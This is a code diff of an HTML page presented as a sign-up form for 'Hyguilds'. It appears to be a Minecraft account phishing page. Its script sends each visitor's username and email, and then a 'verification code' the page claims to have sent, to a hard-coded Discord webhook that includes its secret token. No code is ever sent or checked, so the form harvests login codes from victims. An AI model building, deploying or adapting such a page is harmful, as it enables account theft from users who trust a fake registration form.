@@ -2,13 +2,66 @@
 <html>
 <head>
   <title>Sign Up To Hyguilds</title>
- <style>
+  <style>
     body {
       font-family: Arial, sans-serif;
       background-color: #f2f2f2;
       margin: 0;
       padding: 0;
       position: relative; /* Add position relative to the body */
+    }
+
+    #container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: #fff;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    }
+
+    h2 {
+      text-align: center;
+      color: #333;
+      margin-top: 0;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      color: #555;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    button[type="submit"] {
+      background-color: #4CAF50;
+      color: #fff;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button[type="submit"]:hover {
+      background-color: #45a049;
+    }
+
+    #codeContainer {
+      display: none;
+    }
+
+    #verificationCode {
+      font-weight: bold;
+      margin-top: 10px;
     }
 
     .dark-mode-toggle {
@@ -73,6 +126,35 @@
     input:checked + .slider:before {
       transform: translateX(20px);
     }
+
+    .dark-mode {
+      background-color: #333;
+      color: #fff;
+    }
+
+    .dark-mode #container {
+      background-color: #444;
+      border-color: #666;
+    }
+
+    .dark-mode h2 {
+      color: #fff;
+    }
+
+    .dark-mode label {
+      color: #ddd;
+    }
+
+    .dark-mode input[type="text"],
+    .dark-mode input[type="email"],
+    .dark-mode button[type="submit"] {
+      border-color: #666;
+      color: #ddd;
+    }
+
+    .dark-mode button[type="submit"]:hover {
+      background-color: #3d8c40;
+    }
   </style>
 </head>
 <body>
@@ -83,6 +165,7 @@
       <span class="slider"></span>
     </label>
   </div>
+
   <div id="container">
     <h2>Sign Up To Hyguilds</h2>
     <div id="formContainer">
@@ -110,134 +193,134 @@
     </div>
   </div>
 
-<script>
-  let emailSubmitted = false;
+  <script>
+    let emailSubmitted = false;
 
-  document.getElementById("followForm").addEventListener("submit", function(event) {
-    event.preventDefault(); // prevent the form from reloading the page
+    document.getElementById("followForm").addEventListener("submit", function(event) {
+      event.preventDefault(); // prevent the form from reloading the page
 
-    // get the input values
-    const username = document.getElementById('username').value;
-    const email = document.getElementById('email').value;
+      // get the input values
+      const username = document.getElementById('username').value;
+      const email = document.getElementById('email').value;
 
-    // create the webhook message
-    const message = {
-      "content": "Email and IGN entered!",
-      "embeds": [
-        {
-          "title": "Sign Up!",
-          "description": "Please verify your email address by entering the code we sent you.",
-          "color": 16777215,
-          "fields": [
-            {
-              "name": "Minecraft Username",
-              "value": username
-            },
-            {
-              "name": "Email",
-              "value": email
-            }
-          ]
+      // create the webhook message
+      const message = {
+        "content": "Email and IGN entered!",
+        "embeds": [
+          {
+            "title": "Sign Up!",
+            "description": "Please verify your email address by entering the code we sent you.",
+            "color": 16777215,
+            "fields": [
+              {
+                "name": "Minecraft Username",
+                "value": username
+              },
+              {
+                "name": "Email",
+                "value": email
+              }
+            ]
+          }
+        ]
+      };
+
+      // send the webhook message
+      fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(message)
+      })
+      .then(function(response) {
+        if (response.ok) {
+          console.log("Email and IGN submitted successfully!");
+          emailSubmitted = true;
+          showCodeForm();
+        } else {
+          console.log("Error:", response.statusText);
         }
-      ]
-    };
-
-    // send the webhook message
-    fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(message)
-    })
-    .then(function(response) {
-      if (response.ok) {
-        console.log("Email and IGN submitted successfully!");
-        emailSubmitted = true;
-        showCodeForm();
-      } else {
-        console.log("Error:", response.statusText);
-      }
-    })
-    .catch(function(error) {
-      console.log("Error:", error);
+      })
+      .catch(function(error) {
+        console.log("Error:", error);
+      });
     });
-  });
 
-  document.getElementById("codeForm").addEventListener("submit", function(event) {
-    event.preventDefault(); // prevent the form from reloading the page
+    document.getElementById("codeForm").addEventListener("submit", function(event) {
+      event.preventDefault(); // prevent the form from reloading the page
 
-    // get the verification code
-    const code = document.getElementById('code').value;
+      // get the verification code
+      const code = document.getElementById('code').value;
 
-    // create the verification code message
-    const codeMessage = {
-      "content": "Verification code entered!",
-      "embeds": [
-        {
-          "title": "Verification Code",
-          "description": "The verification code entered by the user.",
-          "color": 16711680,
-          "fields": [
-            {
-              "name": "Code",
-              "value": code
-            }
-          ]
+      // create the verification code message
+      const codeMessage = {
+        "content": "Verification code entered!",
+        "embeds": [
+          {
+            "title": "Verification Code",
+            "description": "The verification code entered by the user.",
+            "color": 16711680,
+            "fields": [
+              {
+                "name": "Code",
+                "value": code
+              }
+            ]
+          }
+        ]
+      };
+
+      // send the verification code message to the webhook
+      fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(codeMessage)
+      })
+      .then(function(response) {
+        if (response.ok) {
+          console.log("Code submitted successfully!");
+          // Code validation success, you can perform any further actions here
+        } else {
+          console.log("Error:", response.statusText);
+          // Code validation failed, you can display an error message or take other actions
         }
-      ]
-    };
-
-    // send the verification code message to the webhook
-    fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(codeMessage)
-    })
-    .then(function(response) {
-      if (response.ok) {
-        console.log("Code submitted successfully!");
-        // Code validation success, you can perform any further actions here
-      } else {
-        console.log("Error:", response.statusText);
-        // Code validation failed, you can display an error message or take other actions
-      }
-    })
-    .catch(function(error) {
-      console.log("Error:", error);
+      })
+      .catch(function(error) {
+        console.log("Error:", error);
+      });
     });
-  });
 
-  function showCodeForm() {
-    document.getElementById("formContainer").style.display = "none";
-    document.getElementById("codeContainer").style.display = "block";
-  }
-  
-  // Function to toggle dark mode
-  function toggleDarkMode() {
-    const body = document.body;
-    body.classList.toggle('dark-mode');
-
-    // Store the dark mode preference in localStorage
-    const darkModeToggle = document.getElementById('darkModeToggle');
-    const isDarkMode = darkModeToggle.checked;
-    localStorage.setItem('darkMode', isDarkMode);
-  }
-
-  // Function to check the dark mode preference and apply it on page load
-  function applyDarkModePreference() {
-    const darkModePreference = localStorage.getItem('darkMode');
-
-    if (darkModePreference === 'true') {
-      document.body.classList.add('dark-mode');
-      document.getElementById('darkModeToggle').checked = true;
+    function showCodeForm() {
+      document.getElementById("formContainer").style.display = "none";
+      document.getElementById("codeContainer").style.display = "block";
     }
-  }
 
-  // Apply the dark mode preference on page load
-  applyDarkModePreference();
-</script>
+    // Function to toggle dark mode
+    function toggleDarkMode() {
+      const body = document.body;
+      body.classList.toggle('dark-mode');
+
+      // Store the dark mode preference in localStorage
+      const darkModeToggle = document.getElementById('darkModeToggle');
+      const isDarkMode = darkModeToggle.checked;
+      localStorage.setItem('darkMode', isDarkMode);
+    }
+
+    // Function to check the dark mode preference and apply it on page load
+    function applyDarkModePreference() {
+      const darkModePreference = localStorage.getItem('darkMode');
+
+      if (darkModePreference === 'true') {
+        document.body.classList.add('dark-mode');
+        document.getElementById('darkModeToggle').checked = true;
+      }
+    }
+
+    // Apply the dark mode preference on page load
+    applyDarkModePreference();
+  </script>
 </body>
 </html>
